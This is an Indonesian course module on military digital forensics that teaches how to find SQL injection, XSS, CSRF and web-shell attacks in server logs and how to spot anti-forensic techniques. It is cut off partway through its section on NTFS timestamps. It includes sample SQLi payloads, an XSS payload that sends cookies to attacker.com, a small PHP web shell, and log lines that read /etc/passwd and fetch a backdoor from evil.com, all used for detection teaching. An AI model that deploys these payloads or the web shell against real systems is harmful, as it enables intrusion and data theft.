# Modul 12: Investigasi Serangan Web dan Teknik Anti-Forensik

**Mata Kuliah:** Digital Forensic for Military Purposes (Forensik Digital untuk Keperluan Militer)  
**SKS:** 3 SKS  
**Pertemuan:** 12  
**Topik:** Investigasi Serangan Web dan Teknik Anti-Forensik  
**Pengampu:** Anindito, S.Kom., S.S., S.H., M.TI., CHFI  

---

## Tujuan Pembelajaran

Setelah menyelesaikan modul ini, mahasiswa diharapkan mampu:

1. Mengidentifikasi berbagai jenis serangan web dan vektor serangan yang umum digunakan
2. Menganalisis log web server (Apache, Nginx, IIS) untuk mendeteksi aktivitas serangan
3. Melakukan investigasi forensik terhadap serangan SQL Injection, XSS, dan CSRF
4. Menjelaskan teknik anti-forensik yang digunakan penyerang untuk menghindari deteksi
5. Mendeteksi manipulasi timestamp, log tampering, dan artifact destruction
6. Menganalisis steganografi dan teknik data hiding dalam konteks forensik
7. Menerapkan forensic countermeasures untuk memverifikasi integritas bukti digital

---

## 1. Dasar-Dasar Keamanan Aplikasi Web

### 1.1 Arsitektur Aplikasi Web

> **Aplikasi Web (Web Application)** adalah program perangkat lunak yang berjalan di web server dan diakses oleh pengguna melalui web browser menggunakan protokol HTTP/HTTPS. Dalam konteks militer, aplikasi web digunakan untuk sistem komando, logistik, dan komunikasi internal.

Arsitektur tipikal aplikasi web terdiri dari tiga lapisan utama:

| Lapisan | Komponen | Fungsi | Contoh Artefak Forensik |
|---------|----------|--------|------------------------|
| **Presentation** | Web browser, HTML/CSS/JS | Antarmuka pengguna | Browser cache, cookies, history |
| **Application** | Web server, application logic | Pemrosesan bisnis | Access logs, error logs, session data |
| **Data** | Database server | Penyimpanan data | Query logs, transaction logs, audit trails |

Dalam investigasi forensik, setiap lapisan menghasilkan artefak yang dapat menjadi bukti digital. Investigator harus memahami alur data dari browser ke database untuk merekonstruksi aktivitas penyerang.

#### 1.1.1 Web Server yang Umum Digunakan

Tiga web server utama yang sering menjadi target investigasi:

1. **Apache HTTP Server**: Web server open-source paling populer, banyak digunakan pada sistem Linux. Log default tersimpan di `/var/log/apache2/` atau `/var/log/httpd/`.

2. **Nginx**: Web server ringan yang sering digunakan sebagai reverse proxy. Log tersimpan di `/var/log/nginx/`.

3. **Microsoft IIS (Internet Information Services)**: Web server bawaan Windows Server, umum pada infrastruktur militer berbasis Microsoft. Log tersimpan di `C:\inetpub\logs\LogFiles\`.

#### Solved Problem 1 ⭐

**Soal:** Jelaskan mengapa pemahaman arsitektur tiga lapisan aplikasi web penting bagi investigator forensik!

**Penyelesaian:**

*Step 1:* Identifikasi peran masing-masing lapisan dalam menghasilkan bukti

*Step 2:* Analisis keterkaitan antar lapisan

**Jawaban:** Pemahaman arsitektur tiga lapisan penting karena: (1) Setiap lapisan menghasilkan artefak forensik yang berbeda — browser menyimpan cache dan cookies, web server menyimpan access log, dan database menyimpan query log. (2) Serangan sering melintasi beberapa lapisan, misalnya SQL injection dimulai dari input browser, melewati application layer, dan berakhir di database. (3) Korelasi bukti antar lapisan diperlukan untuk merekonstruksi timeline serangan secara lengkap.

---

### 1.2 Format Log Web Server

Log web server merupakan sumber bukti utama dalam investigasi serangan web. Setiap request yang masuk ke server dicatat dalam file log.

#### 1.2.1 Apache Combined Log Format

```
192.168.1.100 - admin [15/Jan/2025:10:23:45 +0700] "GET /admin/dashboard.php HTTP/1.1" 200 4523 "http://example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

Komponen log tersebut dapat dipecah sebagai berikut:

| Field | Nilai | Keterangan |
|-------|-------|------------|
| IP Address | `192.168.1.100` | Alamat IP client |
| Identity | `-` | Identitas RFC 1413 (jarang digunakan) |
| User | `admin` | Username terautentikasi |
| Timestamp | `[15/Jan/2025:10:23:45 +0700]` | Waktu request (zona WIB) |
| Request | `"GET /admin/dashboard.php HTTP/1.1"` | Method, URI, dan protokol |
| Status | `200` | HTTP response code |
| Size | `4523` | Ukuran response dalam bytes |
| Referer | `"http://example.com/login"` | Halaman asal |
| User-Agent | `"Mozilla/5.0 ..."` | Informasi browser |

#### 1.2.2 Nginx Log Format

Format default Nginx sangat mirip dengan Apache Combined Log Format:

```
10.0.0.50 - - [15/Jan/2025:10:30:12 +0700] "POST /api/auth HTTP/1.1" 401 158 "-" "curl/7.81.0"
```

Perhatikan bahwa request di atas menggunakan `curl` bukan browser biasa — ini bisa menjadi indikator aktivitas otomatis atau serangan.

#### 1.2.3 IIS Log Format (W3C Extended)

```
2025-01-15 03:23:45 10.0.0.1 GET /admin/config.aspx - 443 admin 192.168.1.200 Mozilla/5.0 200 0 0 125
```

IIS menggunakan format yang sedikit berbeda dengan kolom yang dipisahkan spasi dan urutan field yang dapat dikonfigurasi.

#### Solved Problem 2 ⭐

**Soal:** Dari entri log Apache berikut, identifikasi informasi forensik yang relevan:
```
203.0.113.50 - - [20/Jan/2025:14:05:33 +0700] "GET /admin/users.php?id=1' OR '1'='1 HTTP/1.1" 200 8721 "-" "sqlmap/1.5"
```

**Penyelesaian:**

*Step 1:* Parse setiap field dalam entri log

*Step 2:* Identifikasi indikator serangan

**Jawaban:** Informasi forensik yang relevan: (1) IP penyerang: `203.0.113.50`. (2) Waktu serangan: 20 Januari 2025 pukul 14:05:33 WIB. (3) Payload serangan: parameter `id=1' OR '1'='1` merupakan pola SQL injection klasik. (4) Tool yang digunakan: User-Agent `sqlmap/1.5` menunjukkan penggunaan tool otomatis SQL injection. (5) Response code `200` menunjukkan server memproses request dengan sukses, mengindikasikan serangan mungkin berhasil.

---

## 2. Investigasi Serangan Web

### 2.1 SQL Injection

> **SQL Injection (SQLi)** adalah teknik serangan yang memanfaatkan kerentanan pada input aplikasi web untuk menyisipkan perintah SQL berbahaya ke dalam query database. Serangan ini dapat mengakibatkan kebocoran data, manipulasi data, atau bahkan pengambilalihan server.

SQL Injection merupakan salah satu serangan web paling berbahaya dan sering menargetkan sistem informasi militer. OWASP (Open Worldwide Application Security Project) secara konsisten menempatkan SQLi di peringkat teratas daftar ancaman keamanan web.

#### 2.1.1 Jenis-Jenis SQL Injection

| Jenis | Teknik | Deteksi pada Log |
|-------|--------|-----------------|
| **In-Band SQLi** | UNION-based, Error-based | Payload terlihat langsung di URL/parameter |
| **Blind SQLi** | Boolean-based, Time-based | Banyak request berulang dengan variasi parameter |
| **Out-of-Band SQLi** | DNS lookup, HTTP request | Sulit terdeteksi dari log web saja |

#### 2.1.2 Pola SQLi pada Log Web Server

Investigator dapat mendeteksi upaya SQL injection dengan mencari pola-pola berikut dalam log:

```bash
# Mencari pola SQL injection pada access log Apache
grep -iE "(union.*select|or.*1.*=.*1|and.*1.*=.*1|'.*or.*'|select.*from|drop.*table|insert.*into|update.*set|delete.*from|exec.*xp_|waitfor.*delay|benchmark\()" /var/log/apache2/access.log
```

Pola-pola yang umum ditemukan pada serangan SQLi:

```
# Classic OR-based injection
/page.php?id=1' OR '1'='1
/page.php?id=1 OR 1=1--

# UNION-based injection
/page.php?id=1 UNION SELECT username,password FROM users--

# Time-based blind injection
/page.php?id=1; WAITFOR DELAY '0:0:5'--

# Error-based injection
/page.php?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
```

#### 2.1.3 Skenario Militer: Serangan SQLi pada Sistem Logistik

Sebuah sistem informasi logistik di Kodam Jaya menggunakan aplikasi web untuk mengelola inventaris alutsista. Investigator menemukan entri log berikut:

```
172.16.0.100 - - [10/Feb/2025:08:15:22 +0700] "GET /inventory.php?item_id=1' UNION SELECT username,password,NULL,NULL FROM admin_users-- HTTP/1.1" 200 12450
172.16.0.100 - - [10/Feb/2025:08:15:25 +0700] "GET /inventory.php?item_id=1' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- HTTP/1.1" 200 34521
172.16.0.100 - - [10/Feb/2025:08:16:01 +0700] "GET /inventory.php?item_id=1' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='classified_ops'-- HTTP/1.1" 200 8932
```

Analisis menunjukkan penyerang secara sistematis melakukan enumerasi database: pertama mencari kredensial admin, kemudian daftar tabel, dan akhirnya kolom dari tabel operasi rahasia.

#### Solved Problem 3 ⭐⭐

**Soal:** Analisis tiga entri log di atas dan jelaskan urutan serangan yang dilakukan!

**Penyelesaian:**

*Step 1:* Parse setiap entri dan identifikasi payload SQLi

*Step 2:* Rekonstruksi urutan serangan

**Jawaban:** Urutan serangan: (1) Request pertama (08:15:22) — penyerang melakukan UNION-based SQLi untuk mengekstrak username dan password dari tabel `admin_users`. (2) Request kedua (08:15:25) — penyerang melakukan enumerasi tabel database melalui `information_schema.tables` untuk mengetahui struktur database. (3) Request ketiga (08:16:01) — penyerang menargetkan tabel `classified_ops` dan mengekstrak nama kolom. Ketiga request berasal dari IP `172.16.0.100` dalam rentang waktu 39 detik, menunjukkan serangan terencana dan terarah.

---

### 2.2 Cross-Site Scripting (XSS)

> **Cross-Site Scripting (XSS)** adalah serangan yang menyisipkan skrip berbahaya (biasanya JavaScript) ke dalam halaman web yang kemudian dieksekusi oleh browser pengguna lain. Serangan ini dapat mencuri session cookies, memodifikasi konten halaman, atau mengarahkan pengguna ke situs berbahaya.

#### 2.2.1 Jenis-Jenis XSS

| Jenis | Mekanisme | Persistensi | Contoh |
|-------|-----------|-------------|--------|
| **Reflected XSS** | Payload disisipkan di URL, direfleksikan oleh server | Tidak persisten | `search.php?q=<script>alert(1)</script>` |
| **Stored XSS** | Payload disimpan di database server | Persisten | Komentar berisi `<script>` di forum |
| **DOM-based XSS** | Payload diproses di sisi client (JavaScript) | Tidak persisten | Manipulasi DOM via `document.location` |

#### 2.2.2 Deteksi XSS pada Log Web Server

```bash
# Mencari pola XSS pada access log
grep -iE "(<script|javascript:|onerror=|onload=|onclick=|onmouseover=|eval\(|document\.cookie|document\.location|alert\()" /var/log/apache2/access.log
```

Contoh entri log yang mengandung serangan XSS:

```
10.0.0.55 - - [12/Feb/2025:09:45:12 +0700] "GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1" 200 3421
```

Setelah URL-decoding, payload menjadi:
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

#### Solved Problem 4 ⭐⭐

**Soal:** Jelaskan perbedaan dampak forensik antara Reflected XSS dan Stored XSS!

**Penyelesaian:**

*Step 1:* Analisis persistensi dan lokasi artefak masing-masing jenis

*Step 2:* Bandingkan tantangan investigasi

**Jawaban:** Perbedaan dampak forensik: (1) **Reflected XSS** — payload hanya ada di URL request, sehingga bukti utama ada di access log web server dan browser history korban. Payload tidak tersimpan di server, membuat investigasi bergantung pada kelengkapan log. (2) **Stored XSS** — payload tersimpan di database server, menyediakan bukti persisten yang dapat dianalisis kapan saja. Investigator dapat menemukan payload di database dump dan mengidentifikasi semua korban yang mengakses halaman terinfeksi melalui access log.

---

### 2.3 Cross-Site Request Forgery (CSRF)

> **Cross-Site Request Forgery (CSRF)** adalah serangan yang memaksa pengguna terautentikasi untuk mengirimkan request yang tidak disengaja ke aplikasi web. Penyerang memanfaatkan session aktif korban untuk melakukan aksi tanpa sepengetahuan korban.

#### 2.3.1 Mekanisme Serangan CSRF

Alur serangan CSRF:

1. Korban login ke aplikasi target (misalnya sistem admin militer)
2. Korban mengunjungi halaman berbahaya milik penyerang (melalui link phishing)
3. Halaman berbahaya berisi form tersembunyi yang mengirim request ke aplikasi target
4. Browser korban secara otomatis menyertakan session cookie
5. Aplikasi target memproses request seolah-olah dari korban yang sah

#### 2.3.2 Deteksi CSRF pada Log

Indikator serangan CSRF pada log:

```
# Request POST dengan Referer dari domain eksternal
192.168.1.50 - admin [12/Feb/2025:11:30:45 +0700] "POST /admin/change_password HTTP/1.1" 302 0 "http://evil-site.com/csrf.html" "Mozilla/5.0"
```

Perhatikan bahwa field Referer menunjukkan `http://evil-site.com/csrf.html` — request POST ke endpoint sensitif seharusnya berasal dari domain aplikasi itu sendiri.

#### Solved Problem 5 ⭐⭐

**Soal:** Dari log berikut, identifikasi apakah terjadi serangan CSRF dan jelaskan alasan Anda:
```
10.0.0.25 - operator [15/Feb/2025:14:20:11 +0700] "POST /api/transfer_funds HTTP/1.1" 200 45 "http://malicious.example.com/game.html" "Mozilla/5.0 (Windows NT 10.0)"
```

**Penyelesaian:**

*Step 1:* Analisis field-field pada entri log

*Step 2:* Identifikasi anomali

**Jawaban:** Ya, ini sangat mengindikasikan serangan CSRF. Buktinya: (1) Request POST ke endpoint sensitif (`/api/transfer_funds`) seharusnya berasal dari domain internal aplikasi, bukan dari `http://malicious.example.com/game.html`. (2) Referer berasal dari domain eksternal dengan nama mencurigakan. (3) User `operator` terautentikasi, menunjukkan penyerang memanfaatkan session aktif korban. (4) Response code `200` menunjukkan request berhasil diproses.

---

### 2.4 Web Shell Detection

> **Web Shell** adalah skrip berbahaya yang diunggah ke web server oleh penyerang untuk mendapatkan akses remote dan kontrol penuh terhadap server. Web shell biasanya berupa file PHP, ASP, atau JSP yang menyediakan antarmuka command line melalui browser.

#### 2.4.1 Karakteristik Web Shell

Web shell memiliki beberapa karakteristik yang dapat digunakan untuk deteksi:

| Karakteristik | Contoh | Tool Deteksi |
|---------------|--------|-------------|
| Fungsi eksekusi perintah | `system()`, `exec()`, `passthru()` | grep, YARA rules |
| Obfuscation kode | `base64_decode()`, `eval()`, `str_rot13()` | PHP decoder, deobfuscator |
| Ukuran file kecil | 1-50 KB | File listing dengan sorting |
| Nama file tidak lazim | `x.php`, `cmd.php`, `shell.php` | Pattern matching |
| Timestamp anomali | Waktu modifikasi tidak konsisten | Timeline analysis |

#### 2.4.2 Deteksi Web Shell dengan Command Line

```bash
# Mencari file PHP yang mengandung fungsi berbahaya
grep -rl "eval\|system\|exec\|passthru\|shell_exec\|base64_decode" /var/www/html/ --include="*.php"

# Mencari file yang baru dimodifikasi dalam 7 hari terakhir
find /var/www/html/ -name "*.php" -mtime -7 -ls

# Mencari file PHP dengan ukuran sangat kecil (kemungkinan backdoor)
find /var/www/html/ -name "*.php" -size -5k -ls

# Mencari file PHP di direktori upload
find /var/www/html/uploads/ -name "*.php" -o -name "*.phtml" -o -name "*.php5"
```

#### 2.4.3 Contoh Web Shell Sederhana

```php
<?php
// Web shell sederhana - CONTOH UNTUK EDUKASI
// File ini TIDAK boleh dijalankan di server produksi
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

Penggunaan web shell pada log akan terlihat seperti:

```
203.0.113.99 - - [18/Feb/2025:03:15:22 +0700] "GET /uploads/images/x.php?cmd=whoami HTTP/1.1" 200 15
203.0.113.99 - - [18/Feb/2025:03:15:30 +0700] "GET /uploads/images/x.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1842
203.0.113.99 - - [18/Feb/2025:03:16:01 +0700] "GET /uploads/images/x.php?cmd=wget+http://evil.com/backdoor.elf+-O+/tmp/bd HTTP/1.1" 200 45
```

#### Solved Problem 6 ⭐⭐

**Soal:** Dari log web shell di atas, rekonstruksi aktivitas penyerang dan jelaskan tingkat keparahan serangan!

**Penyelesaian:**

*Step 1:* Analisis setiap request berurutan

*Step 2:* Evaluasi dampak setiap perintah

**Jawaban:** Rekonstruksi aktivitas: (1) 03:15:22 — penyerang menjalankan `whoami` untuk mengidentifikasi user yang menjalankan web server. (2) 03:15:30 — penyerang membaca `/etc/passwd` untuk enumerasi user sistem. (3) 03:16:01 — penyerang mengunduh file backdoor dari server eksternal ke `/tmp/bd`. Tingkat keparahan: **KRITIS**. Penyerang sudah memiliki remote code execution dan sedang melakukan post-exploitation dengan mengunduh malware tambahan. Tindakan segera diperlukan: isolasi server, preservasi bukti, dan incident response.

---

## 3. Analisis Log Web Server

### 3.1 Metodologi Analisis Log

Analisis log web server dalam investigasi forensik mengikuti metodologi sistematis:

| Tahap | Aktivitas | Tujuan |
|-------|-----------|--------|
| 1. Preservasi | Copy log asli, hitung hash | Menjaga integritas bukti |
| 2. Normalisasi | Konversi format, sinkronisasi timezone | Memudahkan analisis |
| 3. Filtering | Eliminasi traffic normal | Fokus pada aktivitas mencurigakan |
| 4. Pattern Matching | Cari pola serangan yang diketahui | Identifikasi jenis serangan |
| 5. Timeline | Susun kronologi kejadian | Rekonstruksi serangan |
| 6. Korelasi | Gabungkan dengan sumber bukti lain | Validasi temuan |

### 3.2 HTTP Status Code yang Relevan untuk Forensik

| Status Code | Arti | Relevansi Forensik |
|-------------|------|-------------------|
| `200` | OK | Request berhasil — serangan mungkin sukses |
| `301/302` | Redirect | Bisa mengindikasikan CSRF atau redirect attack |
| `400` | Bad Request | Payload serangan mungkin malformed |
| `401` | Unauthorized | Percobaan akses tanpa autentikasi |
| `403` | Forbidden | Percobaan akses ke resource terlarang |
| `404` | Not Found | Scanning/probing untuk file yang tidak ada |
| `500` | Server Error | Serangan mungkin menyebabkan error (SQLi error-based) |

### 3.3 Tools Analisis Log

```bash
# Menghitung jumlah request per IP (deteksi scanning)
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20

# Menghitung jumlah request per status code
awk '{print $9}' access.log | sort | uniq -c | sort -rn

# Menampilkan request yang menghasilkan error 500
awk '$9 == 500' access.log

# Mencari request dari IP tertentu
grep "203.0.113.50" access.log

# Analisis User-Agent untuk deteksi scanner/bot
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head -20

# GoAccess - visual log analyzer
goaccess access.log --log-format=COMBINED -o report.html
```

#### Solved Problem 7 ⭐⭐

**Soal:** Tuliskan perintah untuk mencari semua request dari IP `10.0.0.50` yang menghasilkan status code `200` dan mengandung kata `admin` pada URI!

**Penyelesaian:**

*Step 1:* Tentukan field yang perlu difilter (IP = field 1, status = field 9, URI = field 7)

*Step 2:* Gabungkan kondisi filter

**Jawaban:**
```bash
awk '$1 == "10.0.0.50" && $9 == 200 && $7 ~ /admin/' access.log
```
Atau menggunakan grep:
```bash
grep "10.0.0.50" access.log | grep " 200 " | grep "admin"
```

---

### 3.4 Database Forensics dalam Konteks Serangan Web

Ketika serangan SQL injection berhasil, investigator perlu memeriksa database untuk menentukan dampak serangan:

```sql
-- Memeriksa query log MySQL untuk mendeteksi SQLi
-- Aktifkan general log terlebih dahulu
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';

-- Contoh query mencurigakan yang mungkin ditemukan
-- di general log:
-- SELECT * FROM users WHERE id = '1' UNION SELECT 
--   username, password, NULL FROM admin_users--'
```

Artefak database yang perlu diperiksa:

| Artefak | Lokasi | Informasi |
|---------|--------|-----------|
| General Query Log | `/var/log/mysql/general.log` | Semua query yang dieksekusi |
| Slow Query Log | `/var/log/mysql/slow.log` | Query yang berjalan lama (mungkin time-based SQLi) |
| Binary Log | `/var/log/mysql/binlog.*` | Perubahan data (INSERT, UPDATE, DELETE) |
| Error Log | `/var/log/mysql/error.log` | Error yang disebabkan serangan |

#### Solved Problem 8 ⭐⭐⭐

**Soal:** Seorang investigator menemukan entri berikut pada MySQL general log server sistem personalia Lantamal V:
```
2025-02-15T08:30:15.234567Z    25 Query    SELECT * FROM personnel WHERE rank='Kolonel' UNION SELECT credit_card,pin_code,NULL,NULL,NULL FROM financial_data-- '
```
Jelaskan analisis forensik yang harus dilakukan!

**Penyelesaian:**

*Step 1:* Identifikasi jenis serangan dan data target

*Step 2:* Tentukan langkah investigasi

**Jawaban:** Analisis forensik yang harus dilakukan: (1) **Identifikasi serangan**: Query menunjukkan UNION-based SQL injection yang menargetkan tabel `financial_data` untuk mengekstrak `credit_card` dan `pin_code`. (2) **Korelasi log**: Cari entri pada access log web server dengan timestamp yang sama (08:30:15) untuk mengidentifikasi IP penyerang. (3) **Dampak assessment**: Periksa apakah query mengembalikan data (response size pada access log). (4) **Cakupan kebocoran**: Hitung jumlah record di tabel `financial_data` yang mungkin terekspos. (5) **Timeline analysis**: Periksa general log sebelum dan sesudah timestamp ini untuk menemukan aktivitas terkait.

---

## 4. Teknik Anti-Forensik

### 4.1 Definisi dan Klasifikasi Anti-Forensik

> **Anti-Forensik (Anti-Forensics)** adalah serangkaian teknik yang digunakan untuk menghindari, menghalangi, menyesatkan, atau mempersulit proses investigasi forensik digital. Tujuannya adalah menghilangkan, menyembunyikan, atau merusak bukti digital.

Dr. Marcus Rogers mengklasifikasikan teknik anti-forensik menjadi empat kategori utama:

| Kategori | Teknik | Tujuan |
|----------|--------|--------|
| **Data Hiding** | Steganografi, enkripsi, ADS | Menyembunyikan keberadaan data |
| **Artifact Wiping** | Secure delete, log cleaning | Menghapus jejak aktivitas |
| **Trail Obfuscation** | Timestamp manipulation, spoofing | Menyesatkan investigasi |
| **Attacks Against Tools** | Exploit forensic tools, anti-analysis | Menggagalkan proses forensik |

#### 4.1.1 Relevansi Anti-Forensik dalam Konteks Militer

Dalam konteks militer, teknik anti-forensik memiliki dua sisi:

1. **Sebagai ancaman**: Penyerang menggunakan anti-forensik untuk menyembunyikan aktivitas spionase, sabotase, atau insider threat terhadap infrastruktur pertahanan.

2. **Sebagai kapabilitas**: Unit intelijen militer mungkin menggunakan teknik anti-forensik dalam operasi ofensif siber untuk melindungi kerahasiaan operasi.

Pemahaman teknik anti-forensik diperlukan baik untuk mendeteksi penggunaannya oleh penyerang maupun untuk mengembangkan forensic countermeasures yang efektif.

#### Solved Problem 9 ⭐⭐

**Soal:** Jelaskan mengapa pengetahuan anti-forensik penting bagi investigator forensik militer!

**Penyelesaian:**

*Step 1:* Identifikasi perspektif defensif dan ofensif

*Step 2:* Hubungkan dengan konteks operasi militer

**Jawaban:** Pengetahuan anti-forensik penting karena: (1) **Deteksi**: investigator dapat mengenali tanda-tanda penggunaan teknik anti-forensik oleh penyerang dan menggunakan countermeasures yang sesuai. (2) **Validasi bukti**: memahami bagaimana bukti dapat dimanipulasi membantu investigator menilai keandalan bukti yang ditemukan. (3) **Kesadaran operasional**: dalam konteks militer, pemahaman anti-forensik membantu mengamankan operasi siber sendiri dan mengantisipasi taktik musuh.

---

### 4.2 Data Hiding: Steganografi

> **Steganografi (Steganography)** adalah seni dan ilmu menyembunyikan informasi rahasia di dalam media yang tampak normal (gambar, audio, video, teks) sehingga keberadaan pesan rahasia tidak terdeteksi oleh pihak yang tidak berwenang.

Perbedaan antara steganografi dan kriptografi:

| Aspek | Steganografi | Kriptografi |
|-------|-------------|-------------|
| **Tujuan** | Menyembunyikan keberadaan pesan | Melindungi isi pesan |
| **Visibilitas** | Pesan tidak terlihat ada | Pesan terlihat tetapi tidak terbaca |
| **Deteksi** | Sulit mendeteksi keberadaan pesan | Mudah mendeteksi ada pesan terenkripsi |
| **Kecurigaan** | Tidak menimbulkan kecurigaan | Menimbulkan kecurigaan |

#### 4.2.1 Metode Steganografi pada Gambar

**LSB (Least Significant Bit) Substitution:**

Teknik paling umum yang mengganti bit terakhir (least significant) dari setiap byte piksel gambar dengan bit pesan rahasia. Perubahan ini tidak terlihat oleh mata manusia karena hanya mengubah nilai warna sebesar 1 dari 256 level.

Contoh:
```
Piksel asli (RGB):    10110100 11001010 01110001
Bit pesan:            1        0        1
Piksel modifikasi:    10110101 11001010 01110001
                           ^                    
                    Bit terakhir berubah
```

#### 4.2.2 Tools Deteksi Steganografi

| Tool | Platform | Fungsi |
|------|----------|--------|
| **StegSolve** | Java (Cross-platform) | Analisis visual layer gambar |
| **zsteg** | Ruby (Linux/WSL) | Deteksi steganografi pada PNG/BMP |
| **steghide** | Linux/WSL | Embed/extract data pada JPEG/BMP |
| **stegseek** | Linux/WSL | Brute-force password steghide |
| **binwalk** | Linux/WSL | Deteksi file tersembunyi dalam file lain |
| **exiftool** | Cross-platform | Analisis metadata tersembunyi |

```bash
# Deteksi steganografi dengan zsteg
zsteg suspicious_image.png

# Ekstrak data tersembunyi dengan steghide
steghide extract -sf suspicious_image.jpg -p ""

# Brute-force password steghide
stegseek suspicious_image.jpg wordlist.txt

# Analisis dengan binwalk
binwalk -e suspicious_image.png

# Cek metadata tersembunyi
exiftool suspicious_image.jpg
```

#### Solved Problem 10 ⭐⭐

**Soal:** Sebuah gambar PNG ditemukan di USB drive tersangka insider threat di Kodam III/Siliwangi. Jelaskan langkah-langkah analisis steganografi yang harus dilakukan!

**Penyelesaian:**

*Step 1:* Tentukan urutan pemeriksaan dari non-destruktif ke mendalam

*Step 2:* Sebutkan tools yang sesuai untuk setiap langkah

**Jawaban:** Langkah analisis steganografi: (1) **Preservasi**: buat salinan forensik gambar dan hitung hash sebelum analisis. (2) **Metadata analysis**: gunakan `exiftool` untuk memeriksa metadata tersembunyi atau anomali. (3) **Visual analysis**: gunakan StegSolve untuk memeriksa setiap layer bit plane gambar. (4) **Automated detection**: jalankan `zsteg` untuk mendeteksi payload pada LSB dan metode lainnya. (5) **Embedded file check**: gunakan `binwalk` untuk memeriksa apakah ada file yang di-append ke gambar. (6) **Password extraction**: jika steghide terdeteksi, gunakan `stegseek` dengan wordlist untuk brute-force password.

---

### 4.3 Data Hiding: Alternate Data Streams (ADS)

> **Alternate Data Streams (ADS)** adalah fitur sistem file NTFS yang memungkinkan penyimpanan data tambahan yang tersembunyi di dalam file normal. ADS tidak terlihat di Windows Explorer standar dan sering digunakan untuk menyembunyikan data.

#### 4.3.1 Cara Kerja ADS

```cmd
REM Membuat ADS pada file normal
echo "Data rahasia operasi" > dokumen.txt:rahasia.txt

REM Membaca ADS
more < dokumen.txt:rahasia.txt

REM ADS pada direktori
echo "Hidden data" > :hidden_stream.txt
```

File `dokumen.txt` akan terlihat normal di Windows Explorer dengan ukuran file yang sesuai hanya konten utamanya. Data dalam stream `:rahasia.txt` tidak terlihat.

#### 4.3.2 Deteksi ADS

```cmd
REM Menggunakan dir /R (Windows)
dir /R dokumen.txt

REM Menggunakan streams.exe (Sysinternals)
streams.exe -s C:\Users\suspect\Documents\

REM Menggunakan PowerShell
Get-Item dokumen.txt -Stream *
```

#### Solved Problem 11 ⭐⭐

**Soal:** Bagaimana cara mendeteksi dan mengekstrak semua ADS dari direktori kerja tersangka?

**Penyelesaian:**

*Step 1:* Gunakan tool yang dapat membaca ADS

*Step 2:* Ekstrak konten setiap stream

**Jawaban:** (1) Gunakan `streams.exe -s C:\Users\suspect\` untuk memindai semua file dan menampilkan ADS yang ditemukan. (2) Gunakan `dir /S /R C:\Users\suspect\` untuk listing rekursif dengan ADS. (3) Untuk setiap ADS yang ditemukan, ekstrak isinya dengan `more < namafile:namastream` atau `Get-Content namafile -Stream namastream` di PowerShell. (4) Dalam Autopsy, ADS terdeteksi secara otomatis pada forensic image NTFS.

---

### 4.4 Artifact Wiping dan Secure Deletion

> **Artifact Wiping** adalah teknik menghapus jejak digital secara menyeluruh menggunakan metode overwrite yang membuat data tidak dapat di-recover. Berbeda dengan penghapusan normal yang hanya menghapus referensi di file system table.

#### 4.4.1 Metode Secure Deletion

| Metode | Passes | Standar | Keterangan |
|--------|--------|---------|------------|
| Zero Fill | 1 | - | Overwrite dengan nol |
| Random Data | 1 | - | Overwrite dengan data acak |
| DoD 5220.22-M | 3 | US Department of Defense | Karakter, komplemen, random |
| Gutmann | 35 | Peter Gutmann | 35 pola overwrite |
| NIST 800-88 | 1-3 | NIST | Clear, Purge, atau Destroy |

#### 4.4.2 Tools Wiping yang Sering Ditemukan

Investigator harus mengenali tools wiping yang umum digunakan:

| Tool | Platform | Artefak yang Ditinggalkan |
|------|----------|--------------------------|
| **BleachBit** | Windows/Linux | Registry entries, Prefetch files |
| **CCleaner** | Windows | Registry entries, event log |
| **Eraser** | Windows | Registry, scheduled tasks |
| **sdelete** | Windows (Sysinternals) | Prefetch, event log |
| **shred** | Linux | Bash history (jika tidak dihapus) |
| **wipe** | Linux | Bash history |

#### 4.4.3 Deteksi Penggunaan Wiping Tools

Meskipun data yang dihapus mungkin tidak dapat dipulihkan, penggunaan wiping tools itu sendiri meninggalkan jejak:

```cmd
REM Cek Prefetch files untuk evidence of wiping tools
dir C:\Windows\Prefetch\*BLEACHBIT* /S
dir C:\Windows\Prefetch\*CCLEANER* /S
dir C:\Windows\Prefetch\*ERASER* /S
dir C:\Windows\Prefetch\*SDELETE* /S

REM Cek registry untuk installed programs
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "bleachbit ccleaner eraser"

REM Cek event log untuk suspicious deletions
wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text
```

#### Solved Problem 12 ⭐⭐⭐

**Soal:** Seorang tersangka menggunakan BleachBit untuk menghapus semua bukti di laptopnya. Jelaskan artefak apa saja yang masih mungkin ditemukan oleh investigator!

**Penyelesaian:**

*Step 1:* Identifikasi artefak yang dihasilkan oleh instalasi dan eksekusi BleachBit

*Step 2:* Identifikasi artefak yang mungkin terlewat oleh BleachBit

**Jawaban:** Artefak yang masih mungkin ditemukan: (1) **Prefetch files**: `BLEACHBIT.EXE-*.pf` menunjukkan waktu eksekusi BleachBit. (2) **Registry**: Entri instalasi BleachBit di registry Uninstall. (3) **Event logs**: Windows Security Event ID 1102 jika log audit dihapus. (4) **USN Journal**: Catatan perubahan file system mungkin masih ada. (5) **Volume Shadow Copies**: Jika belum dihapus, VSS mungkin menyimpan salinan file sebelum dihapus. (6) **RAM artifacts**: Jika sistem belum dimatikan, sisa data mungkin ada di memori.

---

### 4.5 Trail Obfuscation: Timestamp Manipulation

> **Timestamp Manipulation (Timestomping)** adalah teknik mengubah metadata waktu file (Created, Modified, Accessed, Entry Modified) untuk menyesatkan analisis timeline forensik. Tools seperti `timestomp` (Metasploit) dapat mengubah keempat timestamp NTFS sekaligus.

#### 4.5.1 Timestamp pada NTFS

Setiap file pada NTFS memiliki dua set timestamp yang tersimpan di MFT (Master File Table):

